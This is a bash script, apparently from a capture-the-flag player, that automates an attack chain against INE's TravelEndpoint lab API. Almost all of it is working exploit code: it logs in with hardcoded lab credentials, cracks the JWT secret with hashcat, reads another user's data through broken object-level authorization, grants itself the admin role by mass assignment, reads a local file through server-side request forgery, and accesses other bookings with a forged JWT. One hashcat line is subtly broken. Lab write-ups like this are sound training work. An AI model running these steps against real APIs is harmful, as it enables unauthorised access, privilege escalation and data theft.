#!/usr/bin/bash

# Author: 022y
# Blog: https://0zzy.gitbook.io/0zzy-cyber
# Desc: Bash script to automate INE's TravelEndpoint Endpoint CTF

URL="http://ctf.ine.local"
USER="alice"
PASS="Alice@123"


function api_login {
	# Retrieve jwt token
	
	echo -e "[*] Logging in as $USER"
	JWT_TOKEN=$(curl -s $URL/api/auth/login -X POST -H 'Content-Type: application/json' -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" | grep "jwt" | awk '{print $2}' | cut -d',' -f1 | cut -d'"' -f2)

	echo -e "\tJWT for $USER: $JWT_TOKEN\n"	
	sleep 2
}



function crack_jwt {	
	echo "[*] Cracking JWT"
	CRACK_CMD=$(hashcat -a 0 -m 16500 $JWT_TOKEN /usr/share/wordlists/rockyou.txt --quiet)
	SECRET=$(hashcat -a 0 -m $JWT_TOKEN --show | cut -d':' -f2)

	echo -e "\tjwt secret: $SECRET\n"
	sleep 5
}	






function bola {
	# anyone could view anyones info, no need to be an admin can use our alice jwt
	echo -e "[*] Broken Object Level Authorization(BOLA) Vuln: \n"	
	admin_id="2"
	curl -s $URL/api/users/$admin_id -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT_TOKEN"
	echo "\n"
	sleep 5
}


function mass_assignment {
	echo -e "[*] Mass Assignment Vuln: Assigning ourselves the admin role\n"
	curl -s $URL/api/users/update -X POST -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT_TOKEN" -d '{"user_id":"1","role":"admin"}'
	echo -e "\n"
	sleep 5
}


function admin_reports {
	echo -e "[*] Now an admin, retrieving updated jwt token:"
	api_login
	curl -s $URL/api/admin/reports -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT_TOKEN"
	echo -e "\n"
	sleep 5
}


function ssrf {
	echo -e "Server Side Request Forgery Vuln:"
	curl -s $URL/api/fetch?url=file:///tmp/flag4.txt -H "Authorization: Bearer $JWT_TOKEN"

}


function idor {

	echo -e "[*] Use our original jwt token: $JWT_TOKEN, and dont forget to use the secret $SECRET"
	read -p "Go to jwt.io and change user_id to 3 and enter it here:" user_id_3_jwt

	echo -e "\tRetrieving user_id 3 /api/bookings..."
	curl -s $URL/api/bookings -H "Content-Type: application/json" -H "Authorization: Bearer $user_id_3_jwt"

}

echo -e "[*] INE CTF TravelEndpoint CTF: Flag retrieval/PoC only, full writeup at 0zzy.gitbook.io\n"


api_login
crack_jwt
bola
mass_assignment
ssrf
idor



